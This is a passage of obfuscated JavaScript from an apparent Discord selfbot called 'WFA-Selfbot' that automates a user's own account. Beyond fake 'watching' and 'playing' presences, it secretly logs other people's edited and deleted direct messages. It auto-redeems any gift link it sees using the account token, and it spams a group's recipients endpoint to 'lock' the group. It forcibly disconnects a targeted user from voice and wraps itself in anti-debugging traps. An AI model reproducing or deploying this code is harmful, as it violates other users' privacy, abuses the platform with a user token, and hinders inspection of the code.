        rpcGenerator.getRpcImage('603405368940429315', 'instagram').then(de => {
          let df = new rpcGenerator.Rpc().setName('Instagram').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Instagram').setAssetsLargeImage(de.id).setAssetsLargeText(client.user.username).setState(dd).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(df.toDiscord()).catch(dg => {}), console.log(consolecolor.instagram('[COMMAND] instagram command executed')), a4.edit(':white_check_mark: **You watch ' + dd + ' on Instagram**');
        });
      }

      if (a4.content.startsWith(prefix + 'youtube')) {
        let de = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'youtube').then(df => {
          let dg = new rpcGenerator.Rpc().setName('Youtube').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Youtube').setAssetsLargeImage(df.id).setAssetsLargeText(client.user.username).setState(de).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dg.toDiscord()).catch(dh => {});
          console.log(consolecolor.instagram('[COMMAND] youtube command executed')), a4.edit(':white_check_mark: **You watch ' + de + ' on Youtube**');
        });
      }

      if (a4.content.startsWith(prefix + 'tokyo ghoul')) {
        let df = a6.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tokyo').then(dg => {
          let dh = new rpcGenerator.Rpc().setName('Tokyo Ghoul').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Tokyo Ghoul').setAssetsLargeImage(dg.id).setAssetsLargeText(client.user.username).setState(df).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dh.toDiscord()).catch(di => {}), console.log(consolecolor.instagram('[COMMAND] tokyo ghoul command executed')), a4.edit(':white_check_mark: **You watch ' + df + ' on Tokyo Ghoul**');
        });
      }

      if (a4.content.startsWith(prefix + 'hunter x hunter')) {
        let dg = a6.splice(3).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'hxh').then(dh => {
          let di = new rpcGenerator.Rpc().setName('Hunter X Hunter').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Hunter X Hunter').setAssetsLargeImage(dh.id).setAssetsLargeText(client.user.username).setState(dg).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(di.toDiscord()).catch(dj => {}), console.log(consolecolor.instagram('[COMMAND] hunter x hunter command executed')), a4.edit(':white_check_mark: **You watch ' + dg + ' on Hunter X Hunter**');
        });
      }

      if (a4.content.startsWith(prefix + 'naruto')) {
        let dh = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'naruto').then(di => {
          let dj = new rpcGenerator.Rpc().setName('Naruto').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('721465320740487179').setDetails('Naruto').setAssetsLargeImage(di.id).setAssetsLargeText(client.user.username).setState(dh).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dj.toDiscord()).catch(dk => {}), console.log(consolecolor.instagram('[COMMAND] naruto command executed')), a4.edit(':white_check_mark: **You watch ' + dh + ' on Naruto**');
        });
      }

      if (a4.content.startsWith(prefix + 'pornhub')) {
        let di = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'pornhub').then(dj => {
          const dk = {
            'QqUTc': ':x: **Veuillez executer cette commande sur un serveur!**'
          };
          const dl = dk;
          {
            let dn = new rpcGenerator.Rpc().setName('Pornhub').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Pornhub').setAssetsLargeImage(dj.id).setAssetsLargeText(client.user.username).setState(di).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dn.toDiscord()).catch(dp => {}), console.log(consolecolor.instagram('[COMMAND] pornhub command executed')), a4.edit(':white_check_mark: **You watch ' + di + ' on Pornhub**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'clash of clan')) {
        let dj = a6.splice(3).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'clash-of-clans-app-icon').then(dk => {
          let dl = new rpcGenerator.Rpc().setName('Clash Of Clan').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('721465320740487179').setDetails('WFA-Selfbot').setAssetsLargeImage(dk.id).setAssetsLargeText(client.user.username).setState(dj).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dl.toDiscord()).catch(dm => {}), console.log(consolecolor.instagram('[COMMAND] clash of clans command executed'));
          a4.edit(':white_check_mark: **You play ' + dj + ' on Clash Of Clan**');
        });
      }

      if (a4.content.startsWith(prefix + 'minecraft')) {
        let dk = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'minecraft').then(dl => {
          const dm = {
            'gIwED': ':x: **Veuillez mentionner un utilisateur!**',
            'ocBtx': '%2520',
            'cnMRq': function (dn, dp) {
              return dn + dp;
            },
            'ArJPh': function (dn, dp) {
              return dn + dp;
            },
            'aSGZT': function (dn, dp) {
              return dn * dp;
            },
            'Hlwbl': '[COMMANDE] Commande kiss executé'
          };
          {
            let dp = new rpcGenerator.Rpc().setName('Minecraft').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dl.id).setAssetsLargeText(client.user.username).setState(dk).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dp.toDiscord()).catch(dq => {}), console.log(consolecolor.instagram('[COMMAND] minecraft command executed')), a4.edit(':white_check_mark: **You play ' + dk + ' on Minecraft**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'clash royal')) {
        let dl = a6.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'clashroyal').then(dm => {
          let dn = new rpcGenerator.Rpc().setName('Clash Royal').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dm.id).setAssetsLargeText(client.user.username).setState(dl).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dn.toDiscord()).catch(dp => {});
          console.log(consolecolor.instagram('[COMMAND] clash royale command executed')), a4.edit(':white_check_mark: **You play ' + dl + ' on Clash Royal**');
        });
      }

      if (a4.content.startsWith(prefix + 'tinder')) {
        let dm = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tinder').then(dn => {
          const dp = {
            'szdSq': function (dq, dr) {
              return dq + dr;
            },
            'XNbgZ': function (dq, dr) {
              return dq + dr;
            },
            'IQozk': '\\Update.exe',
            'LHNmF': function (dq, dr, ds) {
              return dq(dr, ds);
            }
          };
          {
            let dq = new rpcGenerator.Rpc().setName('Tinder').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dn.id).setAssetsLargeText(client.user.username).setState(dm).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dq.toDiscord()).catch(dr => {}), console.log(consolecolor.instagram('[COMMAND] tinder command executed')), a4.edit(':white_check_mark: **You play ' + dm + ' on Tinder**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'roblox')) {
        let dn = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'roblox').then(dp => {
          let dq = new rpcGenerator.Rpc().setName('Roblox').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dp.id).setAssetsLargeText(client.user.username).setState(dn).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dq.toDiscord()).catch(dr => {}), console.log(consolecolor.instagram('[COMMAND] roblox command executed')), a4.edit(':white_check_mark: **You play ' + dn + ' on Roblox**');
        });
      }

      if (a4.content.startsWith(prefix + 'badlion')) {
        let dp = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'badlion').then(dq => {
          let dr = new rpcGenerator.Rpc().setName('Badlion').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dq.id).setAssetsLargeText(client.user.username).setState(dp).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dr.toDiscord()).catch(ds => {});
          console.log(consolecolor.instagram('[COMMAND] badlion command executed')), a4.edit(':white_check_mark: **You play ' + dp + ' on Badlion**');
        });
      }

      if (a4.content.startsWith(prefix + 'apex')) {
        let dq = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'apex').then(dr => {
          let ds = new rpcGenerator.Rpc().setName('Apex Legends').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dr.id).setAssetsLargeText(client.user.username).setState(dq).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(ds.toDiscord()).catch(dt => {});
          console.log(consolecolor.instagram('[COMMAND] apex command executed')), a4.edit(':white_check_mark: **You play ' + dq + ' on Apex Legends**');
        });
      }

      if (a4.content.startsWith(prefix + 'csgo')) {
        let ds = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'csgo').then(dt => {
          const du = {
            'WeQoL': function (dv, dw) {
              return dv + dw;
            },
            'XjjIG': 'Change the server name to: ',
            'NGEmy': '[COMMAND] set serveur name command executed'
          };
          {
            let dw = new rpcGenerator.Rpc().setName('Counter Strike').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dt.id).setAssetsLargeText(client.user.username).setState(ds).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dw.toDiscord()).catch(dx => {}), console.log(consolecolor.instagram('[COMMAND] csgo command executed')), a4.edit(':white_check_mark: **You play ' + ds + ' on csgo**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'among us')) {
        let du = a6.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'amongus').then(dv => {
          let dw = new rpcGenerator.Rpc().setName('Among us').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dv.id).setAssetsLargeText('WFA-Selfbot').setState(du).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dw.toDiscord()).catch(dx => {});
          console.log(consolecolor.instagram('[COMMAND] among us command executed'));
          a4.edit(':white_check_mark: **You play ' + du + ' on among us**');
        });
      }

      if (a4.content.startsWith(prefix + 'fortnite')) {
        let dv = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'fortnite').then(dw => {
          const dx = {
            'xFKJZ': function (dy, dz) {
              return dy + dz;
            },
            'BlKrE': function (dy, dz) {
              return dy + dz;
            },
            'RzsSX': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
            'ErZRL': '[COMMAND] ass command executed',
            'quVsJ': 'https://nekobot.xyz/api/image',
            'ViAJV': 'ass'
          };
          {
            let dy = new rpcGenerator.Rpc().setName('Fortnite').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA Selfbot').setAssetsLargeImage(dw.id).setAssetsLargeText('WFA-Selfbot E').setState(dv).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dy.toDiscord()).catch(dz => {}), console.log(consolecolor.instagram('[COMMAND] fortnite command executed')), a4.edit(':white_check_mark: **You play ' + dv + ' on fortnite**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'rocket league')) {
        let dw = a6.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'rocket_league').then(dx => {
          let dy = new rpcGenerator.Rpc().setName('Rocket League').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM').setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657').setApplicationId('603405368940429315').setDetails('WFA Selfbot').setAssetsLargeImage(dx.id).setAssetsLargeText('WFA-Selfbot').setState(dw).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dy.toDiscord()).catch(dz => {}), console.log(consolecolor.instagram('[COMMAND] rocket league command executed'));
          a4.edit(':white_check_mark: **You play ' + dw + ' on rocket league**');
        });
      }
    }), client.on('messageUpdate', a4 => {
      if (a4.author.id === client.user.id) return;

      if (a4.channel.type === 'dm') {
        const a5 = '6|0|2|7|1|4|3|5'.split('|');
        let a6 = 0;
        console.log(' ');
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(consolecolor.atlas('[EVENT] Modified dm:'));
        console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag));
        console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content));
        console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt));
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(' ');
      }
    }), client.on('messageDelete', a4 => {
      if (a4.author.id === client.user.id) return;

      if (a4.channel.type === 'dm') {
        const a5 = '7|2|1|5|0|6|3|4'.split('|');
        let a6 = 0;
        console.log(' ');
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(consolecolor.atlas('[EVENT] Deleted dm:'));
        console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag));
        console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content));
        console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt));
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(' ');
      }

      if (a4.content.includes('@everyone') || a4.content.includes('@here')) {
        if (a4.author.id === client.user.id) return;
        if (a4.channel.type === 'dm') return;
        console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] New Ghostping:')), console.log(consolecolor.atlas('[EVENT] Server: ' + a4.guild.name)), console.log(consolecolor.atlas('[EVENT] Channel: ' + a4.channel.name)), console.log(consolecolor.atlas('[EVENT] User: ' + a4.author.tag)), console.log(consolecolor.atlas('[EVENT] Content: ' + a4.content)), console.log(consolecolor.atlas('[EVENT] At: ' + a4.createdAt)), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
      } else return;
    });

    function a3(a4, a5) {
      let a6 = a4.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
      if (a6) return a5(a6[0]), a3(a4.slice(a6.index + a6[0].length), a5);else a5(null);
    }

    client.on('message', a4 => {
      const a5 = {
        'imECg': '1|3|7|0|4|2|6|5',
        'pGXuQ': function (a7, a8) {
          return a7 + a8;
        },
        'VTKsE': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        'lLFeh': function (a7, a8) {
          return a7 + a8;
        },
        'cSdky': '[EVENT] Contient: ',
        'wENRk': '[EVENT] Message mp supprimé:',
        'VUHio': function (a7, a8) {
          return a7 === a8;
        },
        'ajush': 'lckyX',
        'Cllkh': 'YxajQ',
        'SKzck': '0|2|3|1|5|4',
        'mjKna': '[EVENT] A nitro has probably been added to your credits',
        'sGwFh': function (a7, a8) {
          return a7 == a8;
        },
        'HuFjA': 'https://canary.discordapp.com/api/v6/entitlements/gift-codes/',
        'kAYVc': '/redeem',
        'PltLp': 'post',
        'KgvDW': 'gzip, deflate, br',
        'zpwNP': 'keep-alive',
        'orUZf': 'application/json',
        'bKksB': 'canary.discordapp.com',
        'iQFWk': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'wKABw': 'Firefox',
        'KekUF': '66.0',
        'vbKYs': 'canary',
        'SKTuU': 'base64'
      };
      let a6 = [];
      a3(a4.content, a7 => {
        if (!a7) return;
        if (!a6.includes(a7)) a6.push(a7);
      });
      if (a6.length == 0) return;
      a6.forEach(a7 => {
        const a8 = {};
        a8.channel_id = a4.channel.id;
        fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + a7.split('/').pop() + '/redeem', {
          'method': 'post',
          'headers': {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
            'Authorization': client.token,
            'Connection': 'keep-alive',
            'Content-Length': JSON.stringify(a8).length,
            'Content-Type': 'application/json',
            'Host': 'canary.discordapp.com',
            'Referer': 'https://canary.discordapp.com/channels/' + a4.channel.id + '/' + a4.id,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
            'X-super-properties': Buffer.from(JSON.stringify({
              'os': 'Windows',
              'browser': 'Firefox',
              'device': '',
              'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
              'browser_version': '66.0',
              'os_version': '10',
              'referrer': '',
              'referring_domain': '',
              'referrer_current': '',
              'referring_domain_current': '',
              'release_channel': 'canary',
              'client_build_number': 0x928f,
              'client_event_source': null
            }), 'utf-8').toString('base64')
          },
          'body': JSON.stringify({
            'channel_id': a4.channel.id
          })
        }).then(a9 => {
          const aa = {
            'gdaRT': '0|2|3|1|5|4',
            'oblrt': '[EVENT] A nitro has probably been added to your credits',
            'TmAhN': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
          };
          const ab = aa;
          if (a9.status == 400 || a9.status == 404) return console.log(('code invalide :  ' + a7).red);
          a9.json().then(ac => {
            const ad = '0|2|3|1|5|4'.split('|');
            let ae = 0;
            console.log(ac);
            console.log(' ');
            console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
            console.log(consolecolor.atlas('[EVENT] A nitro has probably been added to your credits'));
            console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
            console.log(' ');
          });
        }).catch(console.error);
      });
    }), client.on('guildDelete', a4 => {
      const a5 = '4|2|1|0|3'.split('|');
      let a6 = 0;
      console.log(' ');
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(consolecolor.atlas('[EVENT] You have left the server ' + a4.name));
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(' ');
    }), client.on('guildCreate', a4 => {
      const a5 = '1|4|2|3|0'.split('|');
      let a6 = 0;
      console.log(' ');
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(consolecolor.atlas('[EVENT] You have joined the server ' + a4.name));
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(' ');
    }), client.on('channelCreate', async a4 => {
      const a5 = {
        'hBETB': function (a6, a7) {
          return a6 + a7;
        },
        'ErOpA': function (a6, a7) {
          return a6 + a7;
        },
        'ShMUD': function (a6, a7) {
          return a6 + a7;
        },
        'ZCoME': '[COMMANDE] Commande hentai executé'
      };
      {
        if (y[client.user.id]) {
          if (!a4) return;
        }

        if (a4.type === 'group') {
          let a7 = y[client.user.id].r;
          a4.send(a7).then(a8 => {
            a4.delete().catch(a9 => {});
          }).catch(a8 => {});
        }
      }
    }), client.lock = new Map(), client.on('message', a4 => {
      const a5 = {
        'SynSV': 'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e',
        'kUaNa': function (a9, aa) {
          return a9 + aa;
        },
        'cFhfq': '[COMMAND] spotify command executed',
        'XPKua': '%2520',
        'TAEay': function (a9, aa) {
          return a9 + aa;
        },
        'dwzOK': function (a9, aa) {
          return a9 + aa;
        },
        'CfPTN': function (a9, aa) {
          return a9 * aa;
        },
        'fubRZ': '[COMMAND] punch command executed'
      };
      let a6, a7;

      function a8() {
        const a9 = {
          'EpkLU': function (aa, ab) {
            return aa * ab;
          },
          'rbcJZ': 'peut etre?',
          'IBhtQ': 'je ne pense pas.',
          'sMphg': 'jamais',
          'pXuOw': function (aa, ab) {
            return aa + ab;
          },
          'ZHmQm': '\nla reponse est: ',
          'uzdXZ': 'Quelle est ta question? :rolling_eyes: (essayeplutot:',
          'LtVUr': function (aa, ab) {
            return aa !== ab;
          },
          'gerqD': 'YhGTB',
          'okBHY': function (aa, ab) {
            return aa === ab;
          },
          'jbKxU': function (aa, ab) {
            return aa !== ab;
          },
          'ovvTD': 'HqLRW',
          'NQZOw': 'retry-after'
        };
        if ((Date.now() - a6) / 1000 < a7) return;

        for (let aa = 0; aa < 30; aa++) {
          const ac = {};
          ac.authorization = token;
          const ad = {
            'method': 'PUT'
          };
          ad.url = 'https://discordapp.com/api/v8/channels/' + a4.channel.id + '/recipients/1337', ad.headers = ac;
          const ae = ad;
          axios.request(ae).catch(af => {
            const ag = {
              'bQUpC': 'peut etre?',
              'gXjYd': 'probablement',
              'zuMOr': 'je ne pense pas.',
              'zfECN': 'jamais',
              'LJmPH': function (ah, ai) {
                return ah + ai;
              },
              'kCpls': function (ah, ai) {
                return ah + ai;
              },
              'bcFuh': '\nla reponse est: ',
              'aZwte': function (ah, ai) {
                return ah * ai;
              },
              'McZJR': function (ah, ai) {
                return ah + ai;
              },
              'iycOK': function (ah, ai) {
                return ah + ai;
              },
              'ozsfw': 'Quelle est ta question? :rolling_eyes: (essayeplutot:'
            };
            {
              if (af.response.status === 429) {
                a7 = af.response.headers['retry-after'], a6 = Date.now();
              }
            }
          });
        }
      }

      if (a4.author.id != client.user.id) return;

      if (a4.content.startsWith(prefix + 'lock')) {
        client.lock.set(a4.channel.id, setInterval(a8, 1000)), a4.edit('⏲️**Group lock avec succès !**'), console.log('Commande lock groupe executé'.yellow), setTimeout(function () {
          a4.delete();
        }, 2000);
      }

      if (a4.content.startsWith(prefix + 'unlock')) {
        let aa = client.lock.get(a4.channel.id);
        clearInterval(aa), a4.edit('⏲️ **Group unlock, il peut mettre jusqua 120s pour être débloquer !**'), console.log('Commande unlock groupe executé'.yellow), setTimeout(function () {
          a4.delete();
        }, 2000);
      }
    }), process.on('unhandledRejection', a4 => {}), process.on('unhandledRejection', (a4, a5) => {}), process.on('uncaughtException', (a4, a5) => {}), process.on('uncaughtExceptionMonitor', (a4, a5) => {}), process.on('beforeExit', a4 => {}), process.on('exit', a4 => {}), process.on('multipleResolves', (a4, a5, a6) => {}), client.on('error', a4 => {}), client.on('reconnecting', a4 => {
      const a5 = {
        'MXimu': function (a6, a7) {
          return a6 === a7;
        },
        'Zfjpy': function (a6, a7) {
          return a6 === a7;
        },
        'MXCyE': 'group',
        'bFtdi': ':x: **Command only usable on server**.',
        'ZfNjt': function (a6, a7) {
          return a6 < a7;
        },
        'rCrdG': function (a6, a7) {
          return a6 + a7;
        },
        'wetwK': 'WFA-𝐱-',
        'JtPES': 'text',
        'WTLRv': '[COMMAND] create channel command executed'
      };
      console.log('Reconnection in progress...');
    }), client.on('resume', a4 => {}), client.on('disconnect', a4 => {
      console.log('deconnected..');
    }), client.on('voiceStateUpdate', a4 => {
      const a5 = {
        'Pdjxj': ':x: **Please run this command on a server!**',
        'BcOzI': '[COMMAND] delete all role command executed'
      };
      const a6 = a5;

      if (B[a4.guild.id]) {
        if (!a4.guild.me.hasPermission('MUTE_MEMBERS')) return;

        if (a4.user.id === B[a4.guild.id].user) {
          a4.setVoiceChannel(null);
        }
      }
    }), client.login(token).catch(a4 => {
      if (a4) console.log('invalid Token!\nchange it in the config.json'.red);
    });
  }
}).catch(() => console.log(consolecolor.morning('[ERREUR] Redémarre le selfbot\n[ERROR] restart the selfbot')) && process.exit(1));

function a(b) {
  const c = {
    'LfENe': function (g) {
      return g();
    },
    'GXtAx': ':white_check_mark: **the anti group is deactivated',
    'PrqUm': '[COMMAND] anti groupe stopé',
    'PJdBZ': '```WFA BACKUP FRIEND\n\nLien hastebins: ',
    'OWVFo': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
    'lCtxj': function (g, h) {
      return g === h;
    },
    'uqvCi': 'nJelP',
    'BnsNB': function (g, h) {
      return g == h;
    },
    'ncBIb': '716967712844414996',
    'IYiTp': 'Congratulations',
    'lfpQB': '2|4|1|0|3',
    'cebCg': '[EVENT] GG Je t\'ai fais gagner le giveaway sur le serveur ',
    'IMtDT': ', va vite reclamer ta récompense',
    'eCbSE': 'string',
    'QCEcs': 'counter',
    'VuVLP': function (g, h) {
      return g === h;
    },
    'mavBO': 'Onuks',
    'ylfQr': function (g, h) {
      return g / h;
    },
    'JBYXd': function (g, h) {
      return g % h;
    },
    'PqHwX': 'debu',
    'cFSdv': 'gger',
    'AXZJM': 'ZpCUv',
    'iwmil': 'qpppj',
    'AWyBm': function (g, h) {
      return g + h;
    },
    'hOVTB': 'stateObject',
    'tNHbW': 'text',
    'lnAgp': 'TXTRk',
    'lSAke': 'TDpsT',
    'ltVzW': function (g, h) {
      return g(h);
    }
  };

  function d(g) {
    const h = {
      'dFSfZ': function (i, j) {
        return i + j;
      },
      'VEmFN': '```WFA BACKUP FRIEND\n\nLien hastebins: ',
      'wufBT': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
      'kwHHg': function (i, j) {
        return i(j);
      },
      'PuteE': function (i, j) {
        return i === j;
      },
      'fKnrG': 'FaZLA',
      'iTPfB': 'nJelP',
      'wOUUE': function (i, j) {
        return i == j;
      },
      'pabEn': '294882584201003009',
      'pxjPo': '716967712844414996',
      'zPCLD': 'Congratulations',
      'BjXpb': '2|4|1|0|3',
      'xKGHa': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
      'avZLU': '[EVENT] GG Je t\'ai fais gagner le giveaway sur le serveur ',
      'zgGTk': ', va vite reclamer ta récompense'
    };
    if (typeof g === 'string') return function (i) {}.constructor('while (true) {}').apply('counter');else {
      ('' + g / g).length !== 1 || g % 20 === 0 ? function () {
        const i = {
          'LeMRR': function (j, k) {
            return j + k;
          },
          'ePtdc': '```WFA BACKUP FRIEND\n\nLien hastebins: ',
          'zQcTX': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
          'avwGY': '[COMMANDE] Commande backup friend executé',
          'VrLSW': 'Successfully backed up ',
          'aUcAs': function (j, k) {
            return j(k);
          },
          'uFEpM': function (j, k) {
            return j + k;
          }
        };
        return true;
      }.constructor('debugger').call('action') : function () {
        return false;
      }.constructor('debugger').apply('stateObject');
    }
    d(++g);
  }

  try {
    if (b) return d;else d(0);
  } catch (h) {}
}
